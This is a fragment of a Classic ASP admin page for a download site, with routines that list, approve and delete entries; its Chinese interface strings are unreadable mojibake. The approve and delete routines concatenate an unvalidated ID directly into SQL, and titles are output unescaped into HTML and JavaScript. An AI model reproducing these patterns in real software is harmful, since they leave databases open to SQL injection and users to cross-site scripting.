		Maininfo=Maininfo&" <tr><td width=40 align=right><img src=image/arr.gif></td><td width=400>&nbsp;&nbsp;<a href=# Class=list>"&TaleRS("l_title")&"</a></td><td><a href=admin.asp?action=down&operate=2&op=edit&id="&TaleRS("l_id")&" class=list title='�༭ ["&TaleRS("l_title")&"]'>�༭</a></td><td><a href=admin.asp?action=down&operate=0&op=del&id="&TaleRS("l_id")&" title='ɾ�� ["&TaleRS("l_title")&"]' class=list onclick="&Chr(34)&"return ask('ȷ��Ҫɾ��\n["&TaleRS("l_title")&"]��');"&Chr(34)&">ɾ��</a></td></tr>"
		TaleRs.MoveNext
		Loop
	Maininfo=Maininfo&"</Table>"
	Else
		Maininfo="<img src=image/arr.gif>&nbsp;Ŀǰ��û�пμ��������ұߵĲ˵����м���<p>"
	End If

		Maininfo=TableH&Pwidth&Maininfo&TableF
	Set TaleRS=NoThing
End Sub
'
Private Sub ASortList()
	Set TaleRS=Conn.ExeCute("Select l_id,l_title From ljy_soft where l_post=False")
	If Not TaleRs.Eof Then
		Maininfo=Maininfo&"<Table>"
		Do While Not TaleRs.Eof 
		Maininfo=Maininfo&" <tr><td width=40 align=right><img src=image/arr.gif></td><td width=350>&nbsp;&nbsp;<a href=# Class=list>"&TaleRS("l_title")&"</a></td><td><a href=admin.asp?action=down&operate=1&op=pass&id="&TaleRS("l_id")&" title='���� ["&TaleRS("l_title")&"]' class=list onclick="&Chr(34)&"return ask('ȷ��Ҫ����\n["&TaleRS("l_title")&"]��');"&Chr(34)&">������</a></td><td><a href=admin.asp?action=down&operate=2&op=edit&id="&TaleRS("l_id")&" class=list title='�༭ ["&TaleRS("l_title")&"]'>�༭</a></td><td><a href=admin.asp?action=down&operate=0&op=del&id="&TaleRS("l_id")&" title='ɾ�� ["&TaleRS("l_title")&"]' class=list onclick="&Chr(34)&"return ask('ȷ��Ҫɾ��\n["&TaleRS("l_title")&"]��');"&Chr(34)&">ɾ��</a></td></tr>"
		TaleRs.MoveNext
		Loop
	Maininfo=Maininfo&"</Table>"
	Else
		Maininfo="<img src=image/arr.gif>&nbsp;Ŀǰ��û�пμ��������ұߵĲ˵����м���<p>"
	End If

		Maininfo=TableH&Pwidth&Maininfo&TableF
	Set TaleRS=NoThing
End Sub
'
Private Sub PassDate()
	If DID="" Then ErrMsg="<li>����ID�Ų���Ϊ��,����ʧ��"
	If ErrMsg="" Then
		Conn.ExeCute("update ljy_soft  set l_post=true  where l_id="&DID&"")
		Maininfo=TableH&Pwidth&"�����ɹ�,�������������"&TableF
	End IF
	Set ReOperate=NoThing
End Sub
'
Private Sub DelDate()
	If DID="" Then ErrMsg="<li>����ID�Ų���Ϊ��,ɾ��ʧ��"
	If ErrMsg="" Then
		Conn.ExeCute("Delete*from ljy_soft where l_id="&DID&"")
		Maininfo=TableH&Pwidth&"ɾ���ɹ�,�������������"&TableF
	End IF
	Set ReOperate=NoThing
End Sub
'
End Class
'
%>